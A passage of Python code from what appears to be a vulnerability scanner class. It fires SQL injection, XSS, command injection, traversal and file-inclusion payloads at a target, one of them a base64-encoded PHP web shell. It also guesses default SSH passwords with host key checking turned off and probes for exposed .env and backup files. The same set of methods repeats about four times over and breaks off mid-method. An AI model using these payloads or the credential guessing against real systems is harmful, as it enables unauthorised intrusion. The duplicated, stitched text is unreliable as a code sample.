                    'type': 'MySQL Root Access',
                    'severity': 'Critical',
                    'details': 'Root access without password is possible'
                })
        except:
            pass
            
        return vulns
        
    def _check_default_credentials(self):
        """Check for default credentials"""
        default_creds = {
            'admin': ['admin', 'password', 'admin123'],
            'root': ['root', 'toor', 'password'],
            'user': ['user', 'password', 'user123']
        }
        
        results = []
        for username, passwords in default_creds.items():
            for password in passwords:
                try:
                    # Try SSH
                    ssh_cmd = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no {username}@{self.target}"
                    result = subprocess.run(ssh_cmd.split(), capture_output=True, text=True)
                    if "Permission denied" not in result.stdout:
                        results.append({
                            'service': 'SSH',
                            'username': username,
                            'password': password,
                            'severity': 'High'
                        })
                except:
                    pass
                    
        return results
        
    def _check_exposed_files(self):
        """Check for exposed sensitive files"""
        files = [
            '/.git/config',
            '/.env',
            '/wp-config.php',
            '/config.php',
            '/backup.sql',
            '/backup.zip'
        ]
        
        results = []
        for file in files:
            try:
                response = requests.get(f"http://{self.target}{file}", verify=False, timeout=5)
                if response.status_code == 200:
                    results.append({
                        'file': file,
                        'severity': 'High',
                        'details': 'Sensitive file is exposed'
                    })
            except:
                continue
                
        return results
        
    def _check_information_disclosure(self):
        """Check for information disclosure"""
        results = []
        
        # Check common headers
        try:
            response = requests.get(f"http://{self.target}", verify=False, timeout=5)
            headers = response.headers
            
            sensitive_headers = ['Server', 'X-Powered-By', 'X-AspNet-Version']
            for header in sensitive_headers:
                if header in headers:
                    results.append({
                        'type': 'Information Disclosure',
                        'severity': 'Medium',
                        'details': f'{header} header reveals: {headers[header]}'
                    })
        except:
            pass
            
        return results
        
    def _check_weak_permissions(self):
        """Check for weak permissions"""
        results = []
        
        # Check common directories
        directories = ['/uploads', '/backup', '/admin', '/config']
        for directory in directories:
            try:
                response = requests.get(f"http://{self.target}{directory}", verify=False, timeout=5)
                if response.status_code == 200:
                    results.append({
                        'type': 'Weak Permissions',
                        'severity': 'Medium',
                        'details': f'Directory {directory} is accessible'
                    })
            except:
                continue
                
        return results
        
    def _is_sql_injection_successful(self, response):
        """Check if SQL injection was successful"""
        sql_errors = [
            "SQL syntax",
            "mysql_fetch_array",
            "ORA-",
            "PostgreSQL",
            "SQLite3::",
            "Warning: mysql_",
            "Warning: pg_",
            "Warning: sqlsrv_",
            "Warning: oci_"
        ]
        
        return any(error in response.text for error in sql_errors)
        
    def _is_file_inclusion_successful(self, response):
        """Check if file inclusion was successful"""
        return "root:" in response.text or "<?php" in response.text
        
    def _is_command_injection_successful(self, response):
        """Check if command injection was successful"""
        return "uid=" in response.text and "gid=" in response.text
        
    def _is_directory_traversal_successful(self, response):
        """Check if directory traversal was successful"""
        return "root:" in response.text

    def _check_sql_injection(self, url):
        """Check for SQL injection vulnerabilities"""
        payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "admin' --",
            "admin' #"
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?id={payload}", verify=False, timeout=5)
                if self._is_sql_injection_successful(response):
                    results.append({
                        'payload': payload,
                        'type': 'SQL Injection',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_xss(self, url):
        """Check for XSS vulnerabilities"""
        payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert(1)"
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?q={payload}", verify=False, timeout=5)
                if payload in response.text:
                    results.append({
                        'payload': payload,
                        'type': 'XSS',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_file_inclusion(self, url):
        """Check for file inclusion vulnerabilities"""
        payloads = [
            "../../../etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://input",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4="
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?file={payload}", verify=False, timeout=5)
                if self._is_file_inclusion_successful(response):
                    results.append({
                        'payload': payload,
                        'type': 'File Inclusion',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_command_injection(self, url):
        """Check for command injection vulnerabilities"""
        payloads = [
            ";id;",
            "| id",
            "$(id)",
            "`id`",
            "&& id"
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?cmd={payload}", verify=False, timeout=5)
                if self._is_command_injection_successful(response):
                    results.append({
                        'payload': payload,
                        'type': 'Command Injection',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_directory_traversal(self, url):
        """Check for directory traversal vulnerabilities"""
        payloads = [
            "../../../etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
            "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?path={payload}", verify=False, timeout=5)
                if self._is_directory_traversal_successful(response):
                    results.append({
                        'payload': payload,
                        'type': 'Directory Traversal',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_ftp_vulnerabilities(self, port):
        """Check FTP vulnerabilities"""
        vulns = []
        try:
            # Check anonymous access
            ftp_cmd = f"ftp -n {self.target} {port}"
            result = subprocess.run(ftp_cmd.split(), capture_output=True, text=True)
            
            if "Anonymous access granted" in result.stdout:
                vulns.append({
                    'type': 'Anonymous FTP Access',
                    'severity': 'High',
                    'details': 'Anonymous access is enabled'
                })
        except:
            pass
            
        return vulns
        
    def _check_ssh_vulnerabilities(self, port):
        """Check SSH vulnerabilities"""
        vulns = []
        try:
            # Check SSH version
            ssh_cmd = f"ssh -v {self.target} -p {port}"
            result = subprocess.run(ssh_cmd.split(), capture_output=True, text=True)
            
            if "SSH-2.0-OpenSSH" in result.stdout:
                version = re.search(r"SSH-2.0-OpenSSH_(\d+\.\d+)", result.stdout)
                if version:
                    vuln_version = float(version.group(1))
                    if vuln_version < 7.0:
                        vulns.append({
                            'type': 'Outdated SSH Version',
                            'severity': 'Medium',
                            'details': f'Running OpenSSH {vuln_version}'
                        })
        except:
            pass
            
        return vulns
        
    def _check_smb_vulnerabilities(self, port):
        """Check SMB vulnerabilities"""
        vulns = []
        try:
            # Check for null sessions
            smb_cmd = f"smbclient -L //{self.target} -p {port} -N"
            result = subprocess.run(smb_cmd.split(), capture_output=True, text=True)
            
            if "Sharename" in result.stdout:
                vulns.append({
                    'type': 'SMB Null Session',
                    'severity': 'High',
                    'details': 'Null sessions are allowed'
                })
        except:
            pass
            
        return vulns
        
    def _check_mysql_vulnerabilities(self, port):
        """Check MySQL vulnerabilities"""
        vulns = []
        try:
            # Check for root access without password
            mysql_cmd = f"mysql -h {self.target} -P {port} -u root -e 'SELECT 1'"
            result = subprocess.run(mysql_cmd.split(), capture_output=True, text=True)
            
            if "ERROR" not in result.stdout:
                vulns.append({
                    'type': 'MySQL Root Access',
                    'severity': 'Critical',
                    'details': 'Root access without password is possible'
                })
        except:
            pass
            
        return vulns
        
    def _check_default_credentials(self):
        """Check for default credentials"""
        default_creds = {
            'admin': ['admin', 'password', 'admin123'],
            'root': ['root', 'toor', 'password'],
            'user': ['user', 'password', 'user123']
        }
        
        results = []
        for username, passwords in default_creds.items():
            for password in passwords:
                try:
                    # Try SSH
                    ssh_cmd = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no {username}@{self.target}"
                    result = subprocess.run(ssh_cmd.split(), capture_output=True, text=True)
                    if "Permission denied" not in result.stdout:
                        results.append({
                            'service': 'SSH',
                            'username': username,
                            'password': password,
                            'severity': 'High'
                        })
                except:
                    pass
                    
        return results
        
    def _check_exposed_files(self):
        """Check for exposed sensitive files"""
        files = [
            '/.git/config',
            '/.env',
            '/wp-config.php',
            '/config.php',
            '/backup.sql',
            '/backup.zip'
        ]
        
        results = []
        for file in files:
            try:
                response = requests.get(f"http://{self.target}{file}", verify=False, timeout=5)
                if response.status_code == 200:
                    results.append({
                        'file': file,
                        'severity': 'High',
                        'details': 'Sensitive file is exposed'
                    })
            except:
                continue
                
        return results
        
    def _check_information_disclosure(self):
        """Check for information disclosure"""
        results = []
        
        # Check common headers
        try:
            response = requests.get(f"http://{self.target}", verify=False, timeout=5)
            headers = response.headers
            
            sensitive_headers = ['Server', 'X-Powered-By', 'X-AspNet-Version']
            for header in sensitive_headers:
                if header in headers:
                    results.append({
                        'type': 'Information Disclosure',
                        'severity': 'Medium',
                        'details': f'{header} header reveals: {headers[header]}'
                    })
        except:
            pass
            
        return results
        
    def _check_weak_permissions(self):
        """Check for weak permissions"""
        results = []
        
        # Check common directories
        directories = ['/uploads', '/backup', '/admin', '/config']
        for directory in directories:
            try:
                response = requests.get(f"http://{self.target}{directory}", verify=False, timeout=5)
                if response.status_code == 200:
                    results.append({
                        'type': 'Weak Permissions',
                        'severity': 'Medium',
                        'details': f'Directory {directory} is accessible'
                    })
            except:
                continue
                
        return results
        
    def _is_sql_injection_successful(self, response):
        """Check if SQL injection was successful"""
        sql_errors = [
            "SQL syntax",
            "mysql_fetch_array",
            "ORA-",
            "PostgreSQL",
            "SQLite3::",
            "Warning: mysql_",
            "Warning: pg_",
            "Warning: sqlsrv_",
            "Warning: oci_"
        ]
        
        return any(error in response.text for error in sql_errors)
        
    def _is_file_inclusion_successful(self, response):
        """Check if file inclusion was successful"""
        return "root:" in response.text or "<?php" in response.text
        
    def _is_command_injection_successful(self, response):
        """Check if command injection was successful"""
        return "uid=" in response.text and "gid=" in response.text
        
    def _is_directory_traversal_successful(self, response):
        """Check if directory traversal was successful"""
        return "root:" in response.text

    def _check_sql_injection(self, url):
        """Check for SQL injection vulnerabilities"""
        payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "admin' --",
            "admin' #"
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?id={payload}", verify=False, timeout=5)
                if self._is_sql_injection_successful(response):
                    results.append({
                        'payload': payload,
                        'type': 'SQL Injection',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_xss(self, url):
        """Check for XSS vulnerabilities"""
        payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert(1)"
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?q={payload}", verify=False, timeout=5)
                if payload in response.text:
                    results.append({
                        'payload': payload,
                        'type': 'XSS',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_file_inclusion(self, url):
        """Check for file inclusion vulnerabilities"""
        payloads = [
            "../../../etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://input",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4="
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?file={payload}", verify=False, timeout=5)
                if self._is_file_inclusion_successful(response):
                    results.append({
                        'payload': payload,
                        'type': 'File Inclusion',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_command_injection(self, url):
        """Check for command injection vulnerabilities"""
        payloads = [
            ";id;",
            "| id",
            "$(id)",
            "`id`",
            "&& id"
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?cmd={payload}", verify=False, timeout=5)
                if self._is_command_injection_successful(response):
                    results.append({
                        'payload': payload,
                        'type': 'Command Injection',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_directory_traversal(self, url):
        """Check for directory traversal vulnerabilities"""
        payloads = [
            "../../../etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
            "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?path={payload}", verify=False, timeout=5)
                if self._is_directory_traversal_successful(response):
                    results.append({
                        'payload': payload,
                        'type': 'Directory Traversal',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_ftp_vulnerabilities(self, port):
        """Check FTP vulnerabilities"""
        vulns = []
        try:
            # Check anonymous access
            ftp_cmd = f"ftp -n {self.target} {port}"
            result = subprocess.run(ftp_cmd.split(), capture_output=True, text=True)
            
            if "Anonymous access granted" in result.stdout:
                vulns.append({
                    'type': 'Anonymous FTP Access',
                    'severity': 'High',
                    'details': 'Anonymous access is enabled'
                })
        except:
            pass
            
        return vulns
        
    def _check_ssh_vulnerabilities(self, port):
        """Check SSH vulnerabilities"""
        vulns = []
        try:
            # Check SSH version
            ssh_cmd = f"ssh -v {self.target} -p {port}"
            result = subprocess.run(ssh_cmd.split(), capture_output=True, text=True)
            
            if "SSH-2.0-OpenSSH" in result.stdout:
                version = re.search(r"SSH-2.0-OpenSSH_(\d+\.\d+)", result.stdout)
                if version:
                    vuln_version = float(version.group(1))
                    if vuln_version < 7.0:
                        vulns.append({
                            'type': 'Outdated SSH Version',
                            'severity': 'Medium',
                            'details': f'Running OpenSSH {vuln_version}'
                        })
        except:
            pass
            
        return vulns
        
    def _check_smb_vulnerabilities(self, port):
        """Check SMB vulnerabilities"""
        vulns = []
        try:
            # Check for null sessions
            smb_cmd = f"smbclient -L //{self.target} -p {port} -N"
            result = subprocess.run(smb_cmd.split(), capture_output=True, text=True)
            
            if "Sharename" in result.stdout:
                vulns.append({
                    'type': 'SMB Null Session',
                    'severity': 'High',
                    'details': 'Null sessions are allowed'
                })
        except:
            pass
            
        return vulns
        
    def _check_mysql_vulnerabilities(self, port):
        """Check MySQL vulnerabilities"""
        vulns = []
        try:
            # Check for root access without password
            mysql_cmd = f"mysql -h {self.target} -P {port} -u root -e 'SELECT 1'"
            result = subprocess.run(mysql_cmd.split(), capture_output=True, text=True)
            
            if "ERROR" not in result.stdout:
                vulns.append({
                    'type': 'MySQL Root Access',
                    'severity': 'Critical',
                    'details': 'Root access without password is possible'
                })
        except:
            pass
            
        return vulns
        
    def _check_default_credentials(self):
        """Check for default credentials"""
        default_creds = {
            'admin': ['admin', 'password', 'admin123'],
            'root': ['root', 'toor', 'password'],
            'user': ['user', 'password', 'user123']
        }
        
        results = []
        for username, passwords in default_creds.items():
            for password in passwords:
                try:
                    # Try SSH
                    ssh_cmd = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no {username}@{self.target}"
                    result = subprocess.run(ssh_cmd.split(), capture_output=True, text=True)
                    if "Permission denied" not in result.stdout:
                        results.append({
                            'service': 'SSH',
                            'username': username,
                            'password': password,
                            'severity': 'High'
                        })
                except:
                    pass
                    
        return results
        
    def _check_exposed_files(self):
        """Check for exposed sensitive files"""
        files = [
            '/.git/config',
            '/.env',
            '/wp-config.php',
            '/config.php',
            '/backup.sql',
            '/backup.zip'
        ]
        
        results = []
        for file in files:
            try:
                response = requests.get(f"http://{self.target}{file}", verify=False, timeout=5)
                if response.status_code == 200:
                    results.append({
                        'file': file,
                        'severity': 'High',
                        'details': 'Sensitive file is exposed'
                    })
            except:
                continue
                
        return results
        
    def _check_information_disclosure(self):
        """Check for information disclosure"""
        results = []
        
        # Check common headers
        try:
            response = requests.get(f"http://{self.target}", verify=False, timeout=5)
            headers = response.headers
            
            sensitive_headers = ['Server', 'X-Powered-By', 'X-AspNet-Version']
            for header in sensitive_headers:
                if header in headers:
                    results.append({
                        'type': 'Information Disclosure',
                        'severity': 'Medium',
                        'details': f'{header} header reveals: {headers[header]}'
                    })
        except:
            pass
            
        return results
        
    def _check_weak_permissions(self):
        """Check for weak permissions"""
        results = []
        
        # Check common directories
        directories = ['/uploads', '/backup', '/admin', '/config']
        for directory in directories:
            try:
                response = requests.get(f"http://{self.target}{directory}", verify=False, timeout=5)
                if response.status_code == 200:
                    results.append({
                        'type': 'Weak Permissions',
                        'severity': 'Medium',
                        'details': f'Directory {directory} is accessible'
                    })
            except:
                continue
                
        return results
        
    def _is_sql_injection_successful(self, response):
        """Check if SQL injection was successful"""
        sql_errors = [
            "SQL syntax",
            "mysql_fetch_array",
            "ORA-",
            "PostgreSQL",
            "SQLite3::",
            "Warning: mysql_",
            "Warning: pg_",
            "Warning: sqlsrv_",
            "Warning: oci_"
        ]
        
        return any(error in response.text for error in sql_errors)
        
    def _is_file_inclusion_successful(self, response):
        """Check if file inclusion was successful"""
        return "root:" in response.text or "<?php" in response.text
        
    def _is_command_injection_successful(self, response):
        """Check if command injection was successful"""
        return "uid=" in response.text and "gid=" in response.text
        
    def _is_directory_traversal_successful(self, response):
        """Check if directory traversal was successful"""
        return "root:" in response.text

    def _check_sql_injection(self, url):
        """Check for SQL injection vulnerabilities"""
        payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "admin' --",
            "admin' #"
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?id={payload}", verify=False, timeout=5)
                if self._is_sql_injection_successful(response):
                    results.append({
                        'payload': payload,
                        'type': 'SQL Injection',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_xss(self, url):
        """Check for XSS vulnerabilities"""
        payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert(1)"
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?q={payload}", verify=False, timeout=5)
                if payload in response.text:
                    results.append({
                        'payload': payload,
                        'type': 'XSS',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_file_inclusion(self, url):
        """Check for file inclusion vulnerabilities"""
        payloads = [
            "../../../etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://input",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4="
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?file={payload}", verify=False, timeout=5)
                if self._is_file_inclusion_successful(response):
                    results.append({
                        'payload': payload,
                        'type': 'File Inclusion',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_command_injection(self, url):
        """Check for command injection vulnerabilities"""
        payloads = [
            ";id;",
            "| id",
            "$(id)",
            "`id`",
            "&& id"
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?cmd={payload}", verify=False, timeout=5)
                if self._is_command_injection_successful(response):
                    results.append({
                        'payload': payload,
                        'type': 'Command Injection',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_directory_traversal(self, url):
        """Check for directory traversal vulnerabilities"""
        payloads = [
            "../../../etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
            "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?path={payload}", verify=False, timeout=5)
                if self._is_directory_traversal_successful(response):
                    results.append({
                        'payload': payload,
                        'type': 'Directory Traversal',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_ftp_vulnerabilities(self, port):
        """Check FTP vulnerabilities"""
        vulns = []
        try:
            # Check anonymous access
            ftp_cmd = f"ftp -n {self.target} {port}"
            result = subprocess.run(ftp_cmd.split(), capture_output=True, text=True)
            
            if "Anonymous access granted" in result.stdout:
                vulns.append({
                    'type': 'Anonymous FTP Access',
                    'severity': 'High',
                    'details': 'Anonymous access is enabled'
                })
        except:
            pass
            
        return vulns
        
    def _check_ssh_vulnerabilities(self, port):
        """Check SSH vulnerabilities"""
        vulns = []
        try:
            # Check SSH version
            ssh_cmd = f"ssh -v {self.target} -p {port}"
            result = subprocess.run(ssh_cmd.split(), capture_output=True, text=True)
            
            if "SSH-2.0-OpenSSH" in result.stdout:
                version = re.search(r"SSH-2.0-OpenSSH_(\d+\.\d+)", result.stdout)
                if version:
                    vuln_version = float(version.group(1))
                    if vuln_version < 7.0:
                        vulns.append({
                            'type': 'Outdated SSH Version',
                            'severity': 'Medium',
                            'details': f'Running OpenSSH {vuln_version}'
                        })
        except:
            pass
            
        return vulns
        
    def _check_smb_vulnerabilities(self, port):
        """Check SMB vulnerabilities"""
        vulns = []
        try:
            # Check for null sessions
            smb_cmd = f"smbclient -L //{self.target} -p {port} -N"
            result = subprocess.run(smb_cmd.split(), capture_output=True, text=True)
            
            if "Sharename" in result.stdout:
                vulns.append({
                    'type': 'SMB Null Session',
                    'severity': 'High',
                    'details': 'Null sessions are allowed'
                })
        except:
            pass
            
        return vulns
        
    def _check_mysql_vulnerabilities(self, port):
        """Check MySQL vulnerabilities"""
        vulns = []
        try:
            # Check for root access without password
            mysql_cmd = f"mysql -h {self.target} -P {port} -u root -e 'SELECT 1'"
            result = subprocess.run(mysql_cmd.split(), capture_output=True, text=True)
            
            if "ERROR" not in result.stdout:
                vulns.append({
                    'type': 'MySQL Root Access',
                    'severity': 'Critical',
                    'details': 'Root access without password is possible'
                })
        except:
            pass
            
        return vulns
        
    def _check_default_credentials(self):
        """Check for default credentials"""
        default_creds = {
            'admin': ['admin', 'password', 'admin123'],
            'root': ['root', 'toor', 'password'],
            'user': ['user', 'password', 'user123']
        }
        
        results = []
        for username, passwords in default_creds.items():
            for password in passwords:
                try:
                    # Try SSH
                    ssh_cmd = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no {username}@{self.target}"
                    result = subprocess.run(ssh_cmd.split(), capture_output=True, text=True)
                    if "Permission denied" not in result.stdout:
                        results.append({
                            'service': 'SSH',
                            'username': username,
                            'password': password,
                            'severity': 'High'
                        })
                except:
                    pass
                    
        return results
        
    def _check_exposed_files(self):
        """Check for exposed sensitive files"""
        files = [
            '/.git/config',
            '/.env',
            '/wp-config.php',
            '/config.php',
            '/backup.sql',
            '/backup.zip'
        ]
        
        results = []
        for file in files:
            try:
                response = requests.get(f"http://{self.target}{file}", verify=False, timeout=5)
                if response.status_code == 200:
                    results.append({
                        'file': file,
                        'severity': 'High',
                        'details': 'Sensitive file is exposed'
                    })
            except:
                continue
                
        return results
        
    def _check_information_disclosure(self):
        """Check for information disclosure"""
        results = []
        
        # Check common headers
        try:
            response = requests.get(f"http://{self.target}", verify=False, timeout=5)
            headers = response.headers
            
            sensitive_headers = ['Server', 'X-Powered-By', 'X-AspNet-Version']
            for header in sensitive_headers:
                if header in headers:
                    results.append({
                        'type': 'Information Disclosure',
                        'severity': 'Medium',
                        'details': f'{header} header reveals: {headers[header]}'
                    })
        except:
            pass
            
        return results
        
    def _check_weak_permissions(self):
        """Check for weak permissions"""
        results = []
        
        # Check common directories
        directories = ['/uploads', '/backup', '/admin', '/config']
        for directory in directories:
            try:
                response = requests.get(f"http://{self.target}{directory}", verify=False, timeout=5)
                if response.status_code == 200:
                    results.append({
                        'type': 'Weak Permissions',
                        'severity': 'Medium',
                        'details': f'Directory {directory} is accessible'
                    })
            except:
                continue
                
        return results
        
    def _is_sql_injection_successful(self, response):
        """Check if SQL injection was successful"""
        sql_errors = [
            "SQL syntax",
            "mysql_fetch_array",
            "ORA-",
            "PostgreSQL",
            "SQLite3::",
            "Warning: mysql_",
            "Warning: pg_",
            "Warning: sqlsrv_",
            "Warning: oci_"
        ]
        
        return any(error in response.text for error in sql_errors)
        
    def _is_file_inclusion_successful(self, response):
        """Check if file inclusion was successful"""
        return "root:" in response.text or "<?php" in response.text
        
    def _is_command_injection_successful(self, response):
        """Check if command injection was successful"""
        return "uid=" in response.text and "gid=" in response.text
        
    def _is_directory_traversal_successful(self, response):
        """Check if directory traversal was successful"""
        return "root:" in response.text

    def _check_sql_injection(self, url):
        """Check for SQL injection vulnerabilities"""
        payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "admin' --",
            "admin' #"
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?id={payload}", verify=False, timeout=5)
                if self._is_sql_injection_successful(response):
                    results.append({
                        'payload': payload,
                        'type': 'SQL Injection',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_xss(self, url):
        """Check for XSS vulnerabilities"""
        payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert(1)"
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?q={payload}", verify=False, timeout=5)
                if payload in response.text:
                    results.append({
                        'payload': payload,
                        'type': 'XSS',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_file_inclusion(self, url):
        """Check for file inclusion vulnerabilities"""
        payloads = [
            "../../../etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://input",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4="
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?file={payload}", verify=False, timeout=5)
                if self._is_file_inclusion_successful(response):
                    results.append({
                        'payload': payload,
                        'type': 'File Inclusion',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_command_injection(self, url):
        """Check for command injection vulnerabilities"""
        payloads = [
            ";id;",
            "| id",
            "$(id)",
            "`id`",
            "&& id"
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?cmd={payload}", verify=False, timeout=5)
                if self._is_command_injection_successful(response):
                    results.append({
                        'payload': payload,
                        'type': 'Command Injection',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_directory_traversal(self, url):
        """Check for directory traversal vulnerabilities"""
        payloads = [
            "../../../etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
            "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"
        ]
        
        results = []
        for payload in payloads:
            try:
                response = requests.get(f"{url}?path={payload}", verify=False, timeout=5)
                if self._is_directory_traversal_successful(response):
                    results.append({
                        'payload': payload,
                        'type': 'Directory Traversal',
                        'evidence': response.text[:100]  # First 100 chars as evidence
                    })
            except:
                continue
                
        return results
        
    def _check_ftp_vulnerabilities(self, port):
        """Check FTP vulnerabilities"""
        vulns = []
        try:
            # Check anonymous access
            ftp_cmd = f"ftp -n {self.target} {port}"
            result = subprocess.run(ftp_cmd.split(), capture_output=True, text=True)
            
            if "Anonymous access granted" in result.stdout:
                vulns.append({
                    'type': 'Anonymous FTP Access',
                    'severity': 'High',
                    'details': 'Anonymous access is enabled'
                })
        except:
            pass
            
        return vulns
        
    def _check_ssh_vulnerabilities(self, port):
        """Check SSH vulnerabilities"""
        vulns = []
        try:
            # Check SSH version
            ssh_cmd = f"ssh -v {self.target} -p {port}"
            result = subprocess.run(ssh_cmd.split(), capture_output=True, text=True)
            
            if "SSH-2.0-OpenSSH" in result.stdout:
                version = re.search(r"SSH-2.0-OpenSSH_(\d+\.\d+)", result.stdout)
                if version:
                    vuln_version = float(version.group(1))
                    if vuln_version < 7.0:
                        vulns.append({
                            'type': 'Outdated SSH Version',
                            'severity': 'Medium',
                            'details': f'Running OpenSSH {vuln_version}'
                        })
        except:
            pass
            
        return vulns
        
    def _check_smb_vulnerabilities(self, port):
        """Check SMB vulnerabilities"""
        vulns = []
        try:
            # Check for null sessions
            smb_cmd = f"smbclient -L //{self.target} -p {port} -N"
            result = subprocess.run(smb_cmd.split(), capture_output=True, text=True)
            
            if "Sharename" in result.stdout:
                vulns.append({
                    'type': 'SMB Null Session',
                    'severity': 'High',
                    'details': 'Null sessions are allowed'
                })
        except:
            pass
            
        return vulns
        
    def _check_mysql_vulnerabilities(self, port):
        """Check MySQL vulnerabilities"""
        vulns = []
        try:
            # Check for root access without password
            mysql_cmd = f"mysql -h {self.target} -P {port} -u root -e 'SELECT 1'"
            result = subprocess.run(mysql_cmd.split(), capture_output=True, text=True)
            
            if "ERROR" not in result.stdout:
                vulns.append({
                    'type': 'MySQL Root Access',
                    'severity': 'Critical',
                    'details': 'Root access without password is possible'
                })
        except:
            pass
            
        return vulns
        
    def _check_default_credentials(self):
        """Check for default credentials"""
        default_creds = {
            'admin': ['admin', 'password', 'admin123'],
            'root': ['root', 'toor', 'password'],
            'user': ['user', 'password', 'user123']
        }
        
        results = []
        for username, passwords in default_creds.items():
            for password in passwords:
                try:
                    # Try SSH
                    ssh_cmd = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no {username}@{self.target}"
                    result = subprocess.run(ssh_cmd.split(), capture_output=True, text=True)
                    if "Permission denied" not in result.stdout:
                        results.append({
                            'service': 'SSH',
                            'username': username,
                            'password': password,
                            'severity': 'High'
                        })
                except:
                    pass
                    
        return results
        
    def _check_exposed_files(self):
        """Check for exposed sensitive files"""
        files = [
            '/.git/config',
            '/.env',
            '/wp-config.php',
            '/config.php',
            '/backup.sql',
            '/backup.zip'
        ]
        
        results = []
        for file in files:
            try:
                response = requests.get(f"http://{self.target}{file}", verify=False, timeout=5)
                if response.status_code == 200:
                    results.append({
                        'file': file,
                        'severity': 'High',
                        'details': 'Sensitive file is exposed'
                    })
            except:
                continue
                
        return results
        
    def _check_information_disclosure(self):
        """Check for information disclosure"""
